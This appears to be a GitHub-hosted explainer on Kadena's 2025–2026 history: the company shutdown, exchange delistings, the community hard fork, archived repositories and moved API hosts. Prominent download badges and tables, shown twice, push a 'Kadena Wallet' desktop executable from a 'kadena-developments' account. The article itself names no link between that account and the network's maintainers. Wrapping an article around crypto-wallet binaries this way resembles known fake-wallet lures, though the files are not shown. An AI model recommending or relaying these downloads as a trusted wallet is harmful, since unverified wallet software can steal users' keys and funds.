![Kadena Wallet](assets/banner-article.png)

<h1 align="center">What Happened to Kadena: The Fourteen Months That Changed Everything</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Most "what happened to Kadena" pages try to retell the whole history and end up vague about the part that matters. The part that matters is short: between October 2025 and November 2026 the project lost its company, its exchange listings, most of its liquidity, and the repositories it had used for eight years, while the network itself kept producing blocks the entire time.

This is a dated record of that period, written so you can check any line against a primary source.

## You'll see this if

- You held KDA through 2025 and want to know what actually happened to it.
- You are reading old guides that still list exchanges which no longer trade KDA.
- You are deciding whether the chain is worth using, mining, or building on in 2026.
- You want the sequence, not the opinion.

## October 2025: the announcement

On 21 October 2025, Kadena's official account stated that the organisation was "no longer able to continue business operations" and would cease "all business activity and active maintenance of the Kadena blockchain immediately", with a small team retained for transition and wind-down. The same statement made two claims that turned out to be load-bearing: that the blockchain was not owned or operated by the company, and that the KDA token and protocol would continue without it.

Both held. That is unusual. Most chain shutdowns are chain shutdowns; this was a company shutdown that left a running network behind.

## Late October to December 2025: the delisting wave

Exchanges do not wait for a chain to fail before protecting themselves. Within three weeks of the announcement, nearly every venue that listed KDA had scheduled an exit:

| Venue | Trading ended | Withdrawals ended |
| --- | --- | --- |
| Binance.US | 28 October 2025 | left open "until further notice" |
| OKX | 29 October 2025 | 22 January 2026 |
| Bitget | 31 October 2025 | not stated |
| MEXC | 2 November 2025 | no deadline given |
| KuCoin | 5 November 2025 | 28 November 2025 |
| Binance | 12 November 2025 | 12 January 2026 |
| Bybit | December 2025 | 23 December 2025 (early termination) |

Notice what these decisions were and were not. They were risk and liquidity decisions taken by private companies, announced in their own help centres with their own deadlines. They were not evidence that blocks had stopped, and several of them explicitly said they would keep processing withdrawals on the "community-maintained network" for a limited period. Users who moved their KDA out in that window kept it; users who did not are now dependent on each venue's leftover-balance policy.

## 6 to 8 November 2025: the fork

A community build of the node software, version 3.0, was published on 6 November 2025. On 8 November it took over the network at block 6,335,858.

The hard fork did one specific thing: it moved control of the platform share and six namespace keysets away from company-held keys and onto a 3-of-5 multisig held by five former core developers. It did not snapshot balances, did not change the token, and did not require users to do anything. If you held KDA in a wallet you controlled, the fork was invisible to you.

The group introduced itself on 15 November 2025. It brings together two of the chain's former technical leads, Edmund Noble for Chainweb and Jose Cardona for Pact, plus ex-devops lead Louis Page and community contributors Pascal Sclafer and Tadeas Kmenta of InFlux Technologies. They publish under the name KDA Community Edition at kda-chain.org, with a GitHub organisation that describes itself as unofficial and unaffiliated with Kadena LLC.

## 15 November 2025: the date everyone misreads

The archived original changelog records that "the Kadena mainnet stopped producing blocks on 2025-11-15T23:26:15Z". Screenshots of that line circulate as proof the chain died.

It describes the company-side lineage, which was abandoned when the community build forked away a week earlier. The surviving network did not stop. This is the clearest example in the whole story of why a single sentence, read without its context, produces the wrong conclusion.

## November 2025 to January 2026: the repositories close

The original node repository was archived read-only on 24 November 2025, the Chainweaver desktop wallet repository on 9 January 2026, and the KIPs repository on the same day.

Archived does not mean deleted. It means no further commits will be accepted there. The code remains public and forkable, and the community organisation is where node releases now come from. For anyone writing or reading technical guidance, though, this is the moment the answer to "where do I get the current version" changed permanently, and a great deal of older documentation never caught up.

## 2026: what the community actually shipped

Releases, in order:

- **3.0** (6 November 2025) - the takeover build.
- **3.0.1** (9 November 2025) - follow-up fixes.
- **3.1** (24 December 2025) - miner voting, SPV expiry handling changed, nodes stop rewinding.
- **3.2** (2 August 2026) - Pact 5.4.1, a new testnet, the SPV window cut to six months, and a miner-triggered hard fork whose activation date is not publicly reported.
- **3.2.1** (21 August 2026) - compile fixes, described as optional.

Published roadmap items that did **not** land: the promised foundation and DAO (the community's own DAO page still reads "under construction", while another page on the same site claims a working DAO), the 30-second block-time reduction (live average is about 30.94 seconds), and the "Loom" Chainweaver successor, for which no release could be found.

So the honest summary of 2026 is: maintenance continued, promised governance did not arrive, and the network kept running at its original parameters.

## Where the infrastructure moved

Three changes affect every guide written before 2026:

| Old | New |
| --- | --- |
| `api.chainweb.com` | `api.chainweb-community.org` |
| `explorer.kadena.io` | community explorers, for example `explorer.chainweb-community.org` |
| `kadena-io` node releases | community fork releases, currently 3.2.x |

The old company API and explorer no longer answer. Any tutorial that hands you a `curl` command against the old host will fail, and the failure will look like a chain problem when it is only a DNS problem.

## The numbers in November 2026

- All twenty chains producing blocks, average block time about 30.9 seconds.
- Network hashrate around 16.8 PH/s, measured by a third-party monitor rather than an official feed.
- KDA trading near $0.008, per a CoinGecko snapshot taken on 10 November 2026.
- One centralised venue still displaying a KDA market, with several smaller fiat and card routes claiming support.

Price and reported supply change hourly, and the two community dashboards do not agree with each other. Treat any single number as a snapshot of a moment, never as a statement about the network's health.

## Why the timeline matters more than the verdict

If you are deciding whether to use, mine, or build on this chain, the sequencing tells you what to watch. The chain survived losing its company; it has not yet demonstrated that it can fund development, restore liquidity, or deliver the governance it promised. Those are open questions with dates attached, and they are answerable by checking releases, DAO status, and exchange support rather than by reading opinion.

Anyone who tells you the story is over, in either direction, is selling you a conclusion the evidence has not reached.

## FAQ

**Was there a token migration?**
No. Same chain, same ticker, same account keys. Several scams in 2025 and 2026 claimed otherwise.

**Did the fork change balances?**
No. It changed who controls platform keysets. Account balances were untouched.

**Why did exchanges delist if the chain kept running?**
Because listings depend on liquidity, revenue, and perceived risk, not on uptime. A technically healthy chain with thin volume is still a commercial liability for a venue.

**Is development continuing?**
Maintenance releases continue. Features promised in the roadmap, including governance and a block-time change, have not shipped.

**What should I check before trusting an old guide?**
The API host, the explorer domain, the node version, and the exchange table. If any of those is pre-2026, the rest of the page is suspect too.

## Related reading

- Is Kadena dead? What ended and what still runs
- Community Edition of Kadena, explained
- KDA delisting and withdrawal deadlines
- Cross-chain transfers in Kadena Wallet

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Is Kadena Dead? What Ended in 2025 and What Still Runs](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/is-kadena-dead-what-still-runs.md)
- [Community Edition of Kadena, Explained](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/community-edition-of-kadena-explained.md)
- [KDA Delisting Deadlines: What Kadena Wallet Holders Should Check](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kda-delisting-withdrawal-deadlines-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
